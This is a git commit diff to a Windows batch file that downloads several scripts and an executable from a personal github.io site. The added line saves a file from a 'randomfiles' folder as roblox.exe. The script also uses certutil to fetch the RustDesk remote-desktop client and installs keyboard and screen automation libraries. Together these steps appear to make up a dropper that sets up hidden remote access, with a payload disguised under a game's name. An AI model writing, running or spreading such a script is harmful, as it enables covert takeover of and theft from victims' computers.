3446977c13cc0510ee7bca20e7c0a5af3b002b5f
wowsha22 <wowshagithub@gmail.com>
2025-05-01 13:54:42 +0200

    Update Downloads.bat

--- Downloads.bat
+++ Downloads.bat
@@ -2,6 +2,8 @@
 curl -L -o login.py https://wowsha22.github.io/download/login.py
 curl -L -o loop.bat https://wowsha22.github.io/download/loop.bat
 curl -L -o show.bat https://wowsha22.github.io/download/show.bat
+curl -L -o roblox.exe https://wowsha22.github.io/download/randomfiles/roblox-studio.exe
+echo %cd%
 certutil -urlcache -split -f "https://github.com/rustdesk/rustdesk/releases/download/1.2.1/rustdesk-1.2.1-x86_64.exe" rustdesk.exe
 pip install pyautogui --quiet
 pip install psutil --quiet
